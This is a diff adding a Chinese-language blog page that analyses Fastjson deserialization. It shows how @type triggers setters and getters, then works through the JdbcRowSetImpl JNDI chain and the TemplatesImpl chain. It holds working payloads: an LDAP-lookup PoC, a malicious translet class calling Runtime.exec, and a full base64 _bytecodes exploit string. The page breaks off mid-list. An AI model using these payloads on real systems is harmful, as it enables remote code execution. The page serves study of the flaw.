@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    Fastjson反序列化过程分析 |
+    
+    Seikei&#39;s Blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  <article id="post-Fastjson-deserialization" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+    
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h1 class="article-title" itemprop="name">
+      Fastjson反序列化过程分析
+    </h1>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2020/02/27/Fastjson-deserialization/" class="article-date">
+  <time datetime="2020-02-26T16:00:00.000Z" itemprop="datePublished">2020-02-27</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+                            
+    <div class="tocbot"></div>
+
+
+
+
+
+                                
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <blockquote>
+<p>本篇文章记录fastjson反序列化的过程，记录自己对fastjson反序列化本质原因的学习过程，不对各版本的绕过做详细分析，版本绕过的分析网络上已经存在很多文章对其进行了清晰的描写。</p>
+</blockquote>
+<a id="more"></a>
+
+<h1 id="fastjson反序列化过程的分析"><a href="#fastjson反序列化过程的分析" class="headerlink" title="fastjson反序列化过程的分析"></a>fastjson反序列化过程的分析</h1><p>先通过一个简单的Demo来认识fastjson的反序列化过程。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjsondeserialization.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestUser</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name; <span class="comment">//私有属性，有getter、setter方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> flag; <span class="comment">//私有属性，有is、setter方法</span></span><br><span class="line">    <span class="keyword">public</span> String gender; <span class="comment">//公有属性，无getter、setter方法</span></span><br><span class="line">    <span class="keyword">private</span> String country; <span class="comment">//私有属性，无getter、setter方法</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TestUser</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"call User default Constructor"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"call User getName"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"call User setName"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isFlag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"call User isFlag"</span>);</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFlag</span><span class="params">(<span class="keyword">boolean</span> flag)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"call User setFlag"</span>);</span><br><span class="line">        <span class="keyword">this</span>.flag = flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"User&#123;"</span> +</span><br><span class="line">                <span class="string">"name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", flag="</span> + flag +</span><br><span class="line">                <span class="string">", gender='"</span> + gender + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", country='"</span> + country + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>当json中存在<code>@type</code>时，fastjson会将json中<code>key:value</code>值映射到@type对应的类中。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjsondeserialization.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FastjsonDeserializationDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        String serializedStr = <span class="string">"&#123;\"@type\":\"com.fastjsondeserialization.test.TestUser\",\"name\":\"seikei\",\"flag\": true,\"gender\":\"male\",\"country\":\"china\"&#125;"</span>;<span class="comment">//</span></span><br><span class="line">        System.out.println(<span class="string">"serializedStr="</span> + serializedStr);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"-----------------------------------------------\n\n"</span>);</span><br><span class="line">        <span class="comment">//通过parse方法进行反序列化，返回的是一个JSONObject]</span></span><br><span class="line">        System.out.println(<span class="string">"JSON.parse(serializedStr)："</span>);</span><br><span class="line">        Object obj1 = JSON.parse(serializedStr);</span><br><span class="line">        System.out.println(<span class="string">"parse反序列化对象名称:"</span> + obj1.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"parse反序列化："</span> + obj1);</span><br><span class="line">        System.out.println(<span class="string">"-----------------------------------------------\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过parseObject,不指定类，返回的是一个JSONObject</span></span><br><span class="line">        System.out.println(<span class="string">"JSON.parseObject(serializedStr)："</span>);</span><br><span class="line">        Object obj2 = JSON.parseObject(serializedStr);</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化对象名称:"</span> + obj2.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化:"</span> + obj2);</span><br><span class="line">        System.out.println(<span class="string">"-----------------------------------------------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>以上代码的执行结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">serializedStr&#x3D;&#123;&quot;@type&quot;:&quot;com.fastjsondeserialization.test.TestUser&quot;,&quot;name&quot;:&quot;seikei&quot;,&quot;flag&quot;: true,&quot;gender&quot;:&quot;male&quot;,&quot;country&quot;:&quot;china&quot;&#125;</span><br><span class="line">-----------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JSON.parse(serializedStr)：</span><br><span class="line">call User default Constructor</span><br><span class="line">call User setName</span><br><span class="line">call User setFlag</span><br><span class="line">parse反序列化对象名称:com.fastjsondeserialization.test.TestUser</span><br><span class="line">parse反序列化：User&#123;name&#x3D;&#39;seikei&#39;, flag&#x3D;true, gender&#x3D;&#39;male&#39;, country&#x3D;&#39;null&#39;&#125;</span><br><span class="line">-----------------------------------------------</span><br><span class="line"></span><br><span class="line">JSON.parseObject(serializedStr)：</span><br><span class="line">call User default Constructor</span><br><span class="line">call User setName</span><br><span class="line">call User setFlag</span><br><span class="line">call User isFlag</span><br><span class="line">call User getName</span><br><span class="line">parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject</span><br><span class="line">parseObject反序列化:&#123;&quot;flag&quot;:true,&quot;gender&quot;:&quot;male&quot;,&quot;name&quot;:&quot;seikei&quot;&#125;</span><br><span class="line">-----------------------------------------------</span><br></pre></td></tr></table></figure>
+
+
+
+<p>注意<code>JSON.parse()</code>和<code>JSON.parseObject（）</code>的差别</p>
+<p><strong>JSON.parse()</strong></p>
+<p>在指定了<code>@type</code>的情况下，自动调用了TestUser类默认构造器，TestUser类对应的setter方法（setName）,最终结果是TestUser类的一个实例。注意默认构造方法、setter方法调用顺序，默认构造器在前，此时属性值还没有被赋值，所以即使默认构造器中存在危险方法，但是危害值还没有被传入，所以默认构造器按理来说不会成为漏洞利用方法，不过对于内部类那种，外部类先初始化了自己的某些属性值，但是内部类默认构造器使用了父类的属性的某些值，依然可能造成危害。</p>
+<p>还有一点需要注意的是<code>public gender</code>被成功赋值了，而<code>private country</code>没有成功赋值，fastjson在1.2.22, 1.1.54.android之后，增加了一个<code>SupportNonPublicField</code>特性，使得<code>private country</code>就算没有setter、getter方法也能成功赋值，该特性有在<code>TemplatesImpl</code>这条调用链中体现。</p>
+<p><strong>JSON.parseObject()</strong></p>
+<p>在指定了<code>@type</code>的情况下，自动调用了TestUser类默认构造器，TestUser类对应的setter方法（setName）以及对应的getter方法（getName）和is方法（isFlag），最终结果是一个字符串。这里多调用了getter和is方法，是因为<code>parseObject</code>在没有其他参数时，调用了<code>JSON.toJSON(obj)</code>，后续会通过gettter方法获取obj属性值。</p>
+<p><code>JSON.parseObject()</code>一直到<code>setName</code>方法的调用栈如下图，看到<code>JSON.parseObject()</code>会调用到<code>JSON.parse()</code>、再调用<code>DefaultJSONParser.parse()</code>，也就是说<code>JSON.parseObject()</code>本质上还是调用<code>JSON.parse()</code>进行反序列化的，区别是<code>parseObject()</code>会额外调用<code>JSON.toJSON()</code>来将Java对象转为JSONObject对象。两者的反序列化的操作时一样的，因此都能成功触发反序列化。</p>
+<p><img src="/2020/02/27/Fastjson-deserialization/fastjson-demo-stack.png" alt="fastjson-demo-stack"></p>
+<p>重点在知道json反序列化会调用setter和getter方法，指定<code>@type</code>时，fastjson会自动调用<code>@type</code>对应类的setter和getter方法，调用setter和getter方法是正常业务功能。但当该类的setter或getter方法可被利用时，会导致漏洞。这也是为什么fastjson在之前的修复一直都是添加类的黑名单，而不是禁止反序列化功能。</p>
+<p>fastjson具体的解析过程可以参考<a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">https://paper.seebug.org/994/</a></p>
+<h1 id="fastjson利用链"><a href="#fastjson利用链" class="headerlink" title="fastjson利用链"></a>fastjson利用链</h1><p>我们知道Json中存在<code>@type</code>时，<code>JSON.parse()</code>会自动调用类的默认构造器和对应的setter方法，<code>JSON.parseObject()</code>会自动调用类的默认构造器和对应的setter、getter和is方法。</p>
+<p>利用的关键是要找出一个特殊的在目标环境中已存在的类，满足如下两个条件：</p>
+<ol>
+<li>该类的构造函数、setter方法、getter方法中的某一个存在危险操作，比如造成命令执行；</li>
+<li>可以控制该漏洞函数的变量（一般就是该类的属性）；</li>
+</ol>
+<h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p><code>JdbcRowSetImpl</code>的PoC为：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"xxx"</span>:&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Object"</span>,<span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>多加一个”xxx”是为了增加Payload的适用性。</p>
+<p><code>JdbcRowSetImpl.java</code>的代码查看方法，先<code>import com.sun.rowset.JdbcRowSetImpl;</code>，然后按住CMD（或CTRL）键点击即可查看。</p>
+<img src="/2020/02/27/Fastjson-deserialization/lookup-jdbcrowsetimpl.png" alt="lookup-jdbcrowsetimpl" style="zoom:39%;">
+
+
+
+<p><code>JdbcRowSetImpl</code>调用链的过程：</p>
+<ol>
+<li><code>JdbcRowSetImpl</code>对象恢复</li>
+</ol>
+<p><img src="/2020/02/27/Fastjson-deserialization/jdbcrowsetimpl-restore.png" alt="jdbcrowsetimpl-restore"></p>
+<ol start="2">
+<li><code>setDataSourceName</code>方法调用</li>
+</ol>
+<p><img src="/2020/02/27/Fastjson-deserialization/jdbcrowsetimpl-setdatasourcename.png" alt="jdbcrowsetimpl-setdatasourcename"></p>
+<ol start="3">
+<li><code>setAutocommit</code>方法调用，里面调用了<code>this.connect()</code></li>
+</ol>
+<p><img src="/2020/02/27/Fastjson-deserialization/jdbcrowsetimpl-setautocommit.png" alt="jdbcrowsetimpl-setautocommit"></p>
+<ol start="4">
+<li><code>this.connect()</code>调用<code>context.lookup(datasourceName)</code></li>
+</ol>
+<p><img src="/2020/02/27/Fastjson-deserialization/jdbcrowsetimpl-connect.png" alt="jdbcrowsetimpl-connect"></p>
+<p><code>javax/naming/InitialContext#lookup</code>进行ldap查询，在此可以进行JNDI注入。</p>
+<p><img src="/2020/02/27/Fastjson-deserialization/InitialContext-lookup.png" alt="InitialContext-lookup"></p>
+<p>整个调用栈过程如下</p>
+<p><img src="/2020/02/27/Fastjson-deserialization/jdbcrowsetimpl-stack.png" alt="jdbcrowsetimpl-stack"></p>
+<p>整个过程调用的都是setter方法，所以该调用链在<code>parse</code>和<code>parseObject()</code>中都能使用。</p>
+<h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，该调用链存在一定的限制，因为在默认情况下只会去反序列化public修饰的属性，在PoC中，<code>_bytecodes</code>和<code>_name</code>都是私有属性，所以想要反序列化这两个属性，需要在<code>parseObject()</code>时设置<code>Feature.SupportNonPublicField</code>。在实际场景中很少会设置<code>Feature.SupportNonPublicField</code>，所以该调用链在实际场景的利用有限。</p>
+<p>首先，在构造函数<code>TemplatesImplDemo</code>中的<code>Runtime.getRuntime().exec()</code>中输入想要执行的命令，然后将代码编译成class文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatesImplDemo</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TemplatesImplDemo</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"open /System/Applications/Calculator.app"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        TemplatesImplDemo t = <span class="keyword">new</span> TemplatesImplDemo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>将<code>evilClassPath</code>参数设置成上面编译得到的class文件。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FastjsonTemplatesImpl</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClass</span><span class="params">(String cls)</span></span>&#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(cls)), bos);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">            <span class="keyword">final</span> String fileSeparator = System.getProperty(<span class="string">"file.separator"</span>);</span><br><span class="line">            <span class="keyword">final</span> String evilClassPath = System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/target/classes/com/fastjsondeserialization/test/TemplatesImplDemo.class"</span>;</span><br><span class="line"></span><br><span class="line">            String evilCode = readClass(evilClassPath);</span><br><span class="line">            <span class="keyword">final</span> String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">            String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                    <span class="string">"\",\"_bytecodes\":[\""</span>+evilCode+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                    <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br><span class="line">            System.out.println(text1);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>得到fastjson的PoC：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADEANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBADRMY29tL2Zhc3Rqc29uZGVzZXJpYWxpemF0aW9uL3Rlc3QvVGVtcGxhdGVzSW1wbERlbW87AQAKRXhjZXB0aW9ucwcALAEACXRyYW5zZm9ybQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALQEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAF0BwAuAQAKU291cmNlRmlsZQEAFlRlbXBsYXRlc0ltcGxEZW1vLmphdmEMAAgACQcALwwAMAAxAQAob3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAwAMgAzAQAyY29tL2Zhc3Rqc29uZGVzZXJpYWxpemF0aW9uL3Rlc3QvVGVtcGxhdGVzSW1wbERlbW8BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAACwAEAAwADQANAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgABAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAAEQAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAAAAAQAXABgAAwABABEAGQACAAoAAAA&#x2F;AAAAAwAAAAGxAAAAAgALAAAABgABAAAAFQAMAAAAIAADAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABoAGwACAA8AAAAEAAEAHAAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAYAAgAGQAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA&#x3D;&#x3D;&quot;],&#39;_name&#39;:&#39;a.b&#39;,&#39;_tfactory&#39;:&#123; &#125;,&quot;_outputProperties&quot;:&#123; &#125;,&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>将这串json字符放入fastjson解析，也就是<code>JSON.parse(&quot;{@type: &quot;...&quot;}&quot;, Feature.SupportNonPublicField)</code>就能触发漏洞。</p>
+<p>PoC中的关键点：</p>
+<ul>
+<li><p><code>_bytecodes</code>和<code>_name</code>都是私有属性，所以想要反序列化这两个属性，需要在<code>parseObject()</code>时设置<code>Feature.SupportNonPublicField</code>；</p>
+</li>
+<li><p><code>_bytecodes</code> 是我们把恶意类的.class文件二进制格式进行Base64编码后得到的字符串；</p>
+</li>
+<li><p>需要设置<code>_outputProperties</code>是因为漏洞利用链的关键会调用其参数的<code>getOutputProperties()</code>方法，进而导致命令执行；</p>
+</li>
+<li><p><code>_tfactory</code>设置为<code>{ }</code>，在<code>defineTransletClasses()</code>时会调用<code>getExternalExtensionsMap()</code>，当为null时会报错，所以要对<code>_tfactory</code>设置；</p>
+</li>
+</ul>
+<p><code>TemplatesImpl</code>调用链的过程：</p>
+<ol>
+<li><code>TemplatesImpl</code>对象恢复，赋值<code>_bytecodes</code>、<code>_name</code>、<code>_tfactory</code>等私有属性，然后会调用<code>getOutputProperties()</code>这个getter方法</li>
+</ol>
+<p><img src="/2020/02/27/Fastjson-deserialization/templatesimpl-getoutputproperties.png" alt="templatesimpl-getoutputproperties"></p>
+<ol start="2">
+<li><code>newTransformer()</code>方法调用，方法里调用了<code>getTransletInstance()</code></li>
+</ol>
+<p><img src="/2020/02/27/Fastjson-deserialization/templatesimpl-newtransformer.png" alt="templatesimpl-newtransformer"></p>
+<ol start="3">
+<li><code>getTransletInstance()</code>方法调用，其中第451行<code>defineTransletClasses()</code>方法中会根据<code>_bytecodes</code>来生成一个java类，生成的java类随后会被<code>getTransletInstance()</code>方法用到生成一个实例。</li>
+</ol>
+<p><img src="/2020/02/27/Fastjson-deserialization/templatesimpl-gettransletinstance.png" alt="templatesimpl-gettransletinstance"></p>
+<ol start="4">
